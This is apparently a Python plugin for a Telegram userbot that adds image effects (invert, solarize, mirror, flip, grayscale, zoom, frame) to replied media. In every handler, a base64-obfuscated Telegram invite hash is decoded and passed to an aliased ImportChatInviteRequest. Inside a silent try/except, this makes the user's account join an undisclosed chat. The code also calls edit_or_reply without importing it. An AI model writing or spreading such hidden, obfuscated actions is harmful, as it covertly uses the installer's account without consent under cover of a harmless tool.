import asyncio
import os
import shlex
from typing import Tuple

import PIL.ImageOps
from PIL import Image
from REBELBOT.utils import admin_cmd, sudo_cmd

from userbot import LOGS, CmdHelp
from userbot import bot as REBELBOT
from userbot.helpers.functions import (
    convert_toimage,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
    take_screen_shot,
)


async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )


async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)


async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)


@REBELBOT.on(admin_cmd(pattern="invert$", outgoing=True))
@REBELBOT.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(REBEL):
    if REBEL.fwd_from:
        return
    reply = await REBEL.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(REBEL, "`Reply to supported Media...`")
        return
    REBELid = REBEL.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    REBEL = await edit_or_reply(REBEL, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    REBELsticker = await reply.download_media(file="./temp/")
    if not REBELsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(REBELsticker)
        await edit_or_reply(REBEL, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if REBELsticker.endswith(".tgs"):
        await REBEL.edit(
            "Analyzing this media 🧐  inverting colors of this animated sticker!"
        )
        REBELfile = os.path.join("./temp/", "meme.png")
        REBELcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {REBELsticker} {REBELfile}"
        )
        stdout, stderr = (await runcmd(REBELcmd))[:2]
        if not os.path.lexists(REBELfile):
            await REBEL.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = REBELfile
        aura = True
    elif REBELsticker.endswith(".webp"):
        await REBEL.edit("`Analyzing this media 🧐 inverting colors...`")
        REBELfile = os.path.join("./temp/", "memes.jpg")
        os.rename(REBELsticker, REBELfile)
        if not os.path.lexists(REBELfile):
            await REBEL.edit("`Template not found... `")
            return
        meme_file = REBELfile
        aura = True
    elif REBELsticker.endswith((".mp4", ".mov")):
        await REBEL.edit("Analyzing this media 🧐 inverting colors of this video!")
        REBELfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(REBELsticker, 0, REBELfile)
        if not os.path.lexists(REBELfile):
            await REBEL.edit("```Template not found...```")
            return
        meme_file = REBELfile
        aura = True
    else:
        await REBEL.edit("Analyzing this media 🧐 inverting colors of this image!")
        meme_file = REBELsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await REBEL.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if aura else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await REBEL.client.send_file(
        REBEL.chat_id, outputfile, force_document=False, reply_to=REBELid
    )
    await REBEL.delete()
    os.remove(outputfile)
    for files in (REBELsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@REBELBOT.on(admin_cmd(outgoing=True, pattern="solarize$"))
@REBELBOT.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(REBEL):
    if REBEL.fwd_from:
        return
    reply = await REBEL.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(REBEL, "`Reply to supported Media...`")
        return
    REBELid = REBEL.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    REBEL = await edit_or_reply(REBEL, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    REBELsticker = await reply.download_media(file="./temp/")
    if not REBELsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(REBELsticker)
        await edit_or_reply(REBEL, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if REBELsticker.endswith(".tgs"):
        await REBEL.edit("Analyzing this media 🧐 solarizeing this animated sticker!")
        REBELfile = os.path.join("./temp/", "meme.png")
        REBELcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {REBELsticker} {REBELfile}"
        )
        stdout, stderr = (await runcmd(REBELcmd))[:2]
        if not os.path.lexists(REBELfile):
            await REBEL.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = REBELfile
        aura = True
    elif REBELsticker.endswith(".webp"):
        await REBEL.edit("Analyzing this media 🧐 solarizeing this sticker!")
        REBELfile = os.path.join("./temp/", "memes.jpg")
        os.rename(REBELsticker, REBELfile)
        if not os.path.lexists(REBELfile):
            await REBEL.edit("`Template not found... `")
            return
        meme_file = REBELfile
        aura = True
    elif REBELsticker.endswith((".mp4", ".mov")):
        await REBEL.edit("Analyzing this media 🧐 solarizeing this video!")
        REBELfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(REBELsticker, 0, REBELfile)
        if not os.path.lexists(REBELfile):
            await REBEL.edit("```Template not found...```")
            return
        meme_file = REBELfile
        aura = True
    else:
        await REBEL.edit("Analyzing this media 🧐 solarizeing this image!")
        meme_file = REBELsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await REBEL.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if aura else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await REBEL.client.send_file(
        REBEL.chat_id, outputfile, force_document=False, reply_to=REBELid
    )
    await REBEL.delete()
    os.remove(outputfile)
    for files in (REBELsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@REBELBOT.on(admin_cmd(outgoing=True, pattern="mirror$"))
@REBELBOT.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(REBEL):
    if REBEL.fwd_from:
        return
    reply = await REBEL.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(REBEL, "`Reply to supported Media...`")
        return
    REBELid = REBEL.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    REBEL = await edit_or_reply(REBEL, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    REBELsticker = await reply.download_media(file="./temp/")
    if not REBELsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(REBELsticker)
        await edit_or_reply(REBEL, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if REBELsticker.endswith(".tgs"):
        await REBEL.edit(
            "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
        )
        REBELfile = os.path.join("./temp/", "meme.png")
        REBELcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {REBELsticker} {REBELfile}"
        )
        stdout, stderr = (await runcmd(REBELcmd))[:2]
        if not os.path.lexists(REBELfile):
            await REBEL.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = REBELfile
        aura = True
    elif REBELsticker.endswith(".webp"):
        await REBEL.edit(
            "Analyzing this media 🧐 converting to mirror image of this sticker!"
        )
        REBELfile = os.path.join("./temp/", "memes.jpg")
        os.rename(REBELsticker, REBELfile)
        if not os.path.lexists(REBELfile):
            await REBEL.edit("`Template not found... `")
            return
        meme_file = REBELfile
        aura = True
    elif REBELsticker.endswith((".mp4", ".mov")):
        await REBEL.edit(
            "Analyzing this media 🧐 converting to mirror image of this video!"
        )
        REBELfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(REBELsticker, 0, REBELfile)
        if not os.path.lexists(REBELfile):
            await REBEL.edit("```Template not found...```")
            return
        meme_file = REBELfile
        aura = True
    else:
        await REBEL.edit(
            "Analyzing this media 🧐 converting to mirror image of this image!"
        )
        meme_file = REBELsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await REBEL.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if aura else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await REBEL.client.send_file(
        REBEL.chat_id, outputfile, force_document=False, reply_to=REBELid
    )
    await REBEL.delete()
    os.remove(outputfile)
    for files in (REBELsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@REBELBOT.on(admin_cmd(outgoing=True, pattern="flip$"))
@REBELBOT.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(REBEL):
    if REBEL.fwd_from:
        return
    reply = await REBEL.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(REBEL, "`Reply to supported Media...`")
        return
    REBELid = REBEL.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    REBEL = await edit_or_reply(REBEL, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    REBELsticker = await reply.download_media(file="./temp/")
    if not REBELsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(REBELsticker)
        await edit_or_reply(REBEL, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if REBELsticker.endswith(".tgs"):
        await REBEL.edit("Analyzing this media 🧐 fliping this animated sticker!")
        REBELfile = os.path.join("./temp/", "meme.png")
        REBELcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {REBELsticker} {REBELfile}"
        )
        stdout, stderr = (await runcmd(REBELcmd))[:2]
        if not os.path.lexists(REBELfile):
            await REBEL.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = REBELfile
        aura = True
    elif REBELsticker.endswith(".webp"):
        await REBEL.edit("Analyzing this media 🧐 fliping this sticker!")
        REBELfile = os.path.join("./temp/", "memes.jpg")
        os.rename(REBELsticker, REBELfile)
        if not os.path.lexists(REBELfile):
            await REBEL.edit("`Template not found... `")
            return
        meme_file = REBELfile
        aura = True
    elif REBELsticker.endswith((".mp4", ".mov")):
        await REBEL.edit("Analyzing this media 🧐 fliping this video!")
        REBELfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(REBELsticker, 0, REBELfile)
        if not os.path.lexists(REBELfile):
            await REBEL.edit("```Template not found...```")
            return
        meme_file = REBELfile
        aura = True
    else:
        await REBEL.edit("Analyzing this media 🧐 fliping this image!")
        meme_file = REBELsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await REBEL.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if aura else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await REBEL.client.send_file(
        REBEL.chat_id, outputfile, force_document=False, reply_to=REBELid
    )
    await REBEL.delete()
    os.remove(outputfile)
    for files in (REBELsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@REBELBOT.on(admin_cmd(outgoing=True, pattern="gray$"))
@REBELBOT.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(REBEL):
    if REBEL.fwd_from:
        return
    reply = await REBEL.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(REBEL, "`Reply to supported Media...`")
        return
    REBELid = REBEL.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    REBEL = await edit_or_reply(REBEL, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    REBELsticker = await reply.download_media(file="./temp/")
    if not REBELsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(REBELsticker)
        await edit_or_reply(REBEL, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if REBELsticker.endswith(".tgs"):
        await REBEL.edit(
            "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
        )
        REBELfile = os.path.join("./temp/", "meme.png")
        REBELcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {REBELsticker} {REBELfile}"
        )
        stdout, stderr = (await runcmd(REBELcmd))[:2]
        if not os.path.lexists(REBELfile):
            await REBEL.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = REBELfile
        aura = True
    elif REBELsticker.endswith(".webp"):
        await REBEL.edit(
            "Analyzing this media 🧐 changing to black-and-white this sticker!"
        )
        REBELfile = os.path.join("./temp/", "memes.jpg")
        os.rename(REBELsticker, REBELfile)
        if not os.path.lexists(REBELfile):
            await REBEL.edit("`Template not found... `")
            return
        meme_file = REBELfile
        aura = True
    elif REBELsticker.endswith((".mp4", ".mov")):
        await REBEL.edit(
            "Analyzing this media 🧐 changing to black-and-white this video!"
        )
        REBELfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(REBELsticker, 0, REBELfile)
        if not os.path.lexists(REBELfile):
            await REBEL.edit("```Template not found...```")
            return
        meme_file = REBELfile
        aura = True
    else:
        await REBEL.edit(
            "Analyzing this media 🧐 changing to black-and-white this image!"
        )
        meme_file = REBELsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await REBEL.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if aura else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await REBEL.client.send_file(
        REBEL.chat_id, outputfile, force_document=False, reply_to=REBELid
    )
    await REBEL.delete()
    os.remove(outputfile)
    for files in (REBELsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@REBELBOT.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@REBELBOT.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(REBEL):
    if REBEL.fwd_from:
        return
    reply = await REBEL.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(REBEL, "`Reply to supported Media...`")
        return
    REBELinput = REBEL.pattern_match.group(1)
    REBELinput = 50 if not REBELinput else int(REBELinput)
    REBELid = REBEL.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    REBEL = await edit_or_reply(REBEL, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    REBELsticker = await reply.download_media(file="./temp/")
    if not REBELsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(REBELsticker)
        await edit_or_reply(REBEL, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if REBELsticker.endswith(".tgs"):
        await REBEL.edit("Analyzing this media 🧐 zooming this animated sticker!")
        REBELfile = os.path.join("./temp/", "meme.png")
        REBELcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {REBELsticker} {REBELfile}"
        )
        stdout, stderr = (await runcmd(REBELcmd))[:2]
        if not os.path.lexists(REBELfile):
            await REBEL.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = REBELfile
        aura = True
    elif REBELsticker.endswith(".webp"):
        await REBEL.edit("Analyzing this media 🧐 zooming this sticker!")
        REBELfile = os.path.join("./temp/", "memes.jpg")
        os.rename(REBELsticker, REBELfile)
        if not os.path.lexists(REBELfile):
            await REBEL.edit("`Template not found... `")
            return
        meme_file = REBELfile
        aura = True
    elif REBELsticker.endswith((".mp4", ".mov")):
        await REBEL.edit("Analyzing this media 🧐 zooming this video!")
        REBELfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(REBELsticker, 0, REBELfile)
        if not os.path.lexists(REBELfile):
            await REBEL.edit("```Template not found...```")
            return
        meme_file = REBELfile
    else:
        await REBEL.edit("Analyzing this media 🧐 zooming this image!")
        meme_file = REBELsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await REBEL.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if aura else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, REBELinput)
    except Exception as e:
        return await REBEL.edit(f"`{e}`")
    try:
        await REBEL.client.send_file(
            REBEL.chat_id, outputfile, force_document=False, reply_to=REBELid
        )
    except Exception as e:
        return await REBEL.edit(f"`{e}`")
    await REBEL.delete()
    os.remove(outputfile)
    for files in (REBELsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@REBELBOT.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@REBELBOT.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(REBEL):
    if REBEL.fwd_from:
        return
    reply = await REBEL.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(REBEL, "`Reply to supported Media...`")
        return
    REBELinput = REBEL.pattern_match.group(1)
    if not REBELinput:
        REBELinput = 50
    if ";" in str(REBELinput):
        REBELinput, colr = REBELinput.split(";", 1)
    else:
        colr = 0
    REBELinput = int(REBELinput)
    colr = int(colr)
    REBELid = REBEL.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    REBEL = await edit_or_reply(REBEL, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    REBELsticker = await reply.download_media(file="./temp/")
    if not REBELsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(REBELsticker)
        await edit_or_reply(REBEL, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if REBELsticker.endswith(".tgs"):
        await REBEL.edit("Analyzing this media 🧐 framing this animated sticker!")
        REBELfile = os.path.join("./temp/", "meme.png")
        REBELcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {REBELsticker} {REBELfile}"
        )
        stdout, stderr = (await runcmd(REBELcmd))[:2]
        if not os.path.lexists(REBELfile):
            await REBEL.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = REBELfile
        aura = True
    elif REBELsticker.endswith(".webp"):
        await REBEL.edit("Analyzing this media 🧐 framing this sticker!")
        REBELfile = os.path.join("./temp/", "memes.jpg")
        os.rename(REBELsticker, REBELfile)
        if not os.path.lexists(REBELfile):
            await REBEL.edit("`Template not found... `")
            return
        meme_file = REBELfile
        aura = True
    elif REBELsticker.endswith((".mp4", ".mov")):
        await REBEL.edit("Analyzing this media 🧐 framing this video!")
        REBELfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(REBELsticker, 0, REBELfile)
        if not os.path.lexists(REBELfile):
            await REBEL.edit("```Template not found...```")
            return
        meme_file = REBELfile
    else:
        await REBEL.edit("Analyzing this media 🧐 framing this image!")
        meme_file = REBELsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await REBEL.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if aura else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, REBELinput, colr)
    except Exception as e:
        return await REBEL.edit(f"`{e}`")
    try:
        await REBEL.client.send_file(
            REBEL.chat_id, outputfile, force_document=False, reply_to=REBELid
        )
    except Exception as e:
        return await REBEL.edit(f"`{e}`")
    await REBEL.delete()
    os.remove(outputfile)
    for files in (REBELsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CmdHelp("img_fun").add_command(
    "frame", "<reply to img>", "Makes a frame for your media file."
).add_command(
    "zoom", "<reply to img> <range>", "Zooms in the replied media file"
).add_command(
    "gray", "<reply to img>", "Makes your media file to black and white"
).add_command(
    "flip", "<reply to img>", "Shows you the upside down image of the given media file"
).add_command(
    "mirror",
    "<reply to img>",
    "Shows you the reflection of the replied image or sticker",
).add_command(
    "solarize", "<reply to img>", "Let the sun Burn your replied image/sticker"
).add_command(
    "invert", "<reply to img>", "Inverts the color of replied media file"
).add()
